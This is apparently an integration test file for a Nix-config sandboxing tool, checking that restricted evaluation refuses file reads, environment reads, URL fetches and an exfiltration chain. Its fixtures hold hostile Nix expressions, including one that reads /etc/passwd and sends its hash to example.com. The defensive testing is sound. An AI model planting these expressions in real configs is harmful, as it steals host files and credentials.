//! Does the invocation actually block the attacks, against real Nix?
//!
//! `src/eval.rs`'s unit tests assert the restriction *flags are present*.
//! That is not the same claim as *the attacks fail*, and this project has
//! been bitten four times by a probe that looked like evidence and tested
//! nothing (`11` §7, `13` §2, `21` §5, `23` §1.1). So these tests run the
//! invocation this crate builds against the Nix on the machine and require
//! each measured attack from `23` §1 to be refused.
//!
//! **Skipped when `nix` is absent**, loudly, so a skip never reads as a pass.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use rachna::config;
use rachna::decide::Capabilities;
use rachna::decision::Category;
use rachna::eval::{ImportSet, Invocation};
use rachna::grant::Grant;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// The pinned nixpkgs to evaluate against, or `None` if Nix is unavailable.
fn nixpkgs_path() -> Option<PathBuf> {
    let out = Command::new("nix")
        .args([
            "eval",
            "--impure",
            "--raw",
            "--expr",
            "(import <nixpkgs> {}).path",
        ])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let path = PathBuf::from(String::from_utf8(out.stdout).ok()?);
    path.exists().then_some(path)
}

struct Fixture {
    dir: PathBuf,
    nixpkgs: PathBuf,
}

impl Fixture {
    /// A scratch project, or `None` when Nix is unavailable.
    fn new(name: &str) -> Option<Self> {
        let nixpkgs = nixpkgs_path()?;
        let dir = std::env::temp_dir().join(format!("rachna-eval-{name}"));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).ok()?;
        Some(Self { dir, nixpkgs })
    }

    fn write(&self, name: &str, contents: &str) -> PathBuf {
        let path = self.dir.join(name);
        fs::write(&path, contents).expect("fixture write");
        path
    }

    /// Runs the invocation this crate builds. Returns (success, stdout, stderr).
    fn evaluate(&self, config: &Path, attr: Option<&str>) -> (bool, String, String) {
        // `canonicalised`, not `restricted`: on macOS `/var` and `/tmp` are
        // symlinks, and Nix compares the -I allowlist against resolved paths.
        // Using the unresolved form here is what surfaced that bug.
        let invocation = Invocation::canonicalised(&self.dir, config, &self.nixpkgs)
            .expect("fixture paths resolve");
        let mut command = Command::new("nix");
        command.args(invocation.args());
        if let Some(attr) = attr {
            command.arg(attr);
        }
        for key in invocation.cleared_env() {
            command.env_remove(key);
        }
        // A secret in the environment, so the getEnv attack has a real target
        // to steal — per the rule that an adversarial test must first assert
        // what it attacks exists.
        command.env("RACHNA_TEST_SECRET", "sk-live-must-not-leak");
        let out = command.output().expect("nix is on PATH");
        (
            out.status.success(),
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        )
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.dir);
    }
}

/// Whether a skip is permitted here.
///
/// A printed skip still exits 0, so a CI job with no Nix would report green
/// having proven nothing — the exact failure shape this file exists to
/// prevent. So the skip is only allowed when nobody claimed Nix was present:
/// `RACHNA_REQUIRE_NIX=1` turns a missing Nix into a failure, and the CI job
/// that installs Nix sets it.
fn skip_is_permitted() -> bool {
    std::env::var("RACHNA_REQUIRE_NIX").is_err()
}

macro_rules! fixture_or_skip {
    ($name:literal) => {
        match Fixture::new($name) {
            Some(fixture) => fixture,
            None => {
                assert!(
                    skip_is_permitted(),
                    "RACHNA_REQUIRE_NIX is set but nix or <nixpkgs> is \
                     unavailable — this job would otherwise pass having \
                     tested nothing"
                );
                eprintln!("SKIPPED {}: nix or <nixpkgs> unavailable", $name);
                return;
            }
        }
    };
}

#[test]
fn a_legitimate_config_with_a_relative_import_still_evaluates() {
    // The cost side of the trade. If restriction broke ordinary configs it
    // would not be shippable, so this is asserted before the attacks.
    let fixture = fixture_or_skip!("legit");
    fixture.write("frag.nix", r#"{ hosts = [ "registry.npmjs.org:443" ]; }"#);
    let config = fixture.write(
        "rachna.nix",
        r#"let extra = import ./frag.nix;
           in { tier = "allowlist"; network.allow = extra.hosts; }"#,
    );

    let (ok, stdout, stderr) = fixture.evaluate(&config, None);
    assert!(ok, "a legitimate config must evaluate\nstderr: {stderr}");
    assert!(
        stdout.contains("registry.npmjs.org:443"),
        "the imported value must be present: {stdout}"
    );
}

#[test]
fn the_import_set_includes_a_transitively_imported_fragment() {
    // `23` §3.1: laziness hides imports, and `--json` forcing the config is
    // what makes the trace complete. A watcher built on an incomplete set
    // silently ignores edits.
    let fixture = fixture_or_skip!("imports");
    fixture.write("deep.nix", "{ port = 5432; }");
    fixture.write(
        "frag.nix",
        r#"let d = import ./deep.nix; in { hosts = [ "a:443" ]; port = d.port; }"#,
    );
    let config = fixture.write(
        "rachna.nix",
        r#"let e = import ./frag.nix;
           in { network.allow = e.hosts; dbPort = e.port; }"#,
    );

    let (ok, _, stderr) = fixture.evaluate(&config, None);
    assert!(ok, "fixture must evaluate: {stderr}");

    let set = ImportSet::from_stderr(&stderr);
    assert!(!set.is_empty(), "the trace format may have changed");
    for expected in ["rachna.nix", "frag.nix", "deep.nix"] {
        assert!(
            set.files().iter().any(|f| f.ends_with(expected)),
            "{expected} missing from the import set: {:?}",
            set.files()
        );
    }
}

#[test]
fn reading_a_host_file_is_refused() {
    // `23` §1 attack 1, measured succeeding unrestricted.
    let fixture = fixture_or_skip!("readfile");
    assert!(
        Path::new("/etc/passwd").exists(),
        "the attack target must exist, or this test proves nothing"
    );
    let config = fixture.write(
        "rachna.nix",
        r#"{ stolen = builtins.readFile "/etc/passwd"; }"#,
    );

    let (ok, stdout, stderr) = fixture.evaluate(&config, Some("stolen"));
    assert!(!ok, "readFile must be refused\nstdout: {stdout}");
    assert!(
        !stdout.contains("root:"),
        "passwd content leaked into stdout: {stdout}"
    );
    assert!(
        stderr.contains("forbidden in restricted mode") || stderr.contains("access to absolute"),
        "expected a restriction error, got: {stderr}"
    );
}

#[test]
fn reading_the_environment_is_refused() {
    // `23` §1 attack 3. A developer's shell routinely holds
    // AWS_SECRET_ACCESS_KEY and GITHUB_TOKEN, and unrestricted `getEnv`
    // returns them with no prompt and no trace.
    let fixture = fixture_or_skip!("getenv");
    let config = fixture.write(
        "rachna.nix",
        r#"{ leaked = builtins.getEnv "RACHNA_TEST_SECRET"; }"#,
    );

    let (_, stdout, _) = fixture.evaluate(&config, Some("leaked"));
    // `getEnv` under restriction returns "" rather than erroring, so the
    // assertion is on the SECRET not appearing, not on the exit code.
    assert!(
        !stdout.contains("sk-live-must-not-leak"),
        "the environment leaked: {stdout}"
    );
}

#[test]
fn fetching_a_url_is_refused() {
    // `23` §1 attack 2 — the egress half of the exfiltration chain.
    let fixture = fixture_or_skip!("fetchurl");
    let config = fixture.write(
        "rachna.nix",
        r#"{ fetched = builtins.fetchurl "https://example.com/"; }"#,
    );

    let (ok, _, stderr) = fixture.evaluate(&config, Some("fetched"));
    assert!(!ok, "fetchurl must be refused");
    assert!(
        stderr.contains("forbidden in restricted mode") || stderr.contains("access to URI"),
        "expected a restriction error, got: {stderr}"
    );
}

#[test]
fn the_full_exfiltration_chain_is_refused() {
    // `23` §1 attack 4: read a host file, hash it, send it out. The one that
    // matters, because it runs host-side at full privilege on `rachna start`
    // from a cloned repo, before any guest exists.
    let fixture = fixture_or_skip!("exfil");
    assert!(Path::new("/etc/passwd").exists(), "target must exist");
    let config = fixture.write(
        "rachna.nix",
        r#"{
             leak = builtins.fetchurl
               "https://example.com/?d=${builtins.hashString "sha256"
                 (builtins.readFile "/etc/passwd")}";
           }"#,
    );

    let (ok, _, stderr) = fixture.evaluate(&config, Some("leak"));
    assert!(!ok, "the exfiltration chain must be refused");
    assert!(
        stderr.contains("forbidden in restricted mode")
            || stderr.contains("access to absolute")
            || stderr.contains("access to URI"),
        "expected a restriction error, got: {stderr}"
    );
}

#[test]
fn the_module_system_still_works_against_our_pin() {
    // `19` §2 evaluates `rachna.nix` through `lib.evalModules`, so if
    // restriction broke that, the whole config design would be unshippable.
    let fixture = fixture_or_skip!("modules");
    fixture.write(
        "mod.nix",
        r#"{ lib, ... }: {
             options.tier = lib.mkOption { type = lib.types.str; default = "none"; };
           }"#,
    );
    let config = fixture.write(
        "rachna.nix",
        r#"let p = import <nixpkgs> {};
           in (p.lib.evalModules {
                modules = [ ./mod.nix { tier = "allowlist"; } ];
              }).config"#,
    );

    let (ok, stdout, stderr) = fixture.evaluate(&config, None);
    assert!(ok, "evalModules must work under restriction: {stderr}");
    assert!(stdout.contains("allowlist"), "{stdout}");
}

#[test]
fn a_real_evaluation_parses_into_a_policy() {
    // The end-to-end claim of step 5: a rachna.nix on disk becomes a Policy,
    // through the real restricted evaluator and the real parser. The unit
    // tests in src/config.rs use JSON captured from an evaluation; this
    // proves the capture still matches what Nix emits today, so a Nix change
    // to key ordering or number formatting is caught here rather than in
    // production.
    let fixture = fixture_or_skip!("parse");
    let config = fixture.write(
        "rachna.nix",
        r#"{
             tier = "allowlist";
             profile = "development";
             network.allow = [ "registry.npmjs.org:443" "github.com:443" ];
             filesystem.mounts = [
               { source = "/tmp/proj"; target = "/workspace";
                 access = "read-write"; }
             ];
             ports = [ { guest = 3000; host = 3000; } ];
             tools.expose = [
               { name = "rust-analyzer"; kind = "lsp"; network = false; }
             ];
             secrets = [ "aws" ];
           }"#,
    );

    let (ok, stdout, stderr) = fixture.evaluate(&config, None);
    assert!(ok, "fixture must evaluate: {stderr}");

    let policy = config::parse(&stdout, Capabilities::all())
        .unwrap_or_else(|e| panic!("real nix output must parse:\n{e}\njson: {stdout}"));

    let mut categories: Vec<Category> = policy.grants.iter().map(Grant::category).collect();
    categories.sort_unstable();
    categories.dedup();
    assert_eq!(
        categories,
        Category::ALL.to_vec(),
        "every category should round-trip from real nix output"
    );
}

#[test]
fn a_config_with_an_unknown_option_is_refused_end_to_end() {
    // A misspelled key must not reach the parser as "no grants". Here the
    // typo is well-formed Nix, so this is the second line of defence the
    // parser exists to be (`22` §2.2 covers the module-system line).
    let fixture = fixture_or_skip!("typo");
    let config = fixture.write(
        "rachna.nix",
        r#"{ tier = "allowlist"; profile = "development";
             netwrk.allow = [ "a:1" ]; }"#,
    );

    let (ok, stdout, stderr) = fixture.evaluate(&config, None);
    assert!(
        ok,
        "the typo is valid Nix, so evaluation succeeds: {stderr}"
    );
    assert!(
        config::parse(&stdout, Capabilities::all()).is_err(),
        "a misspelled option must be refused, not read as no grants: {stdout}"
    );
}
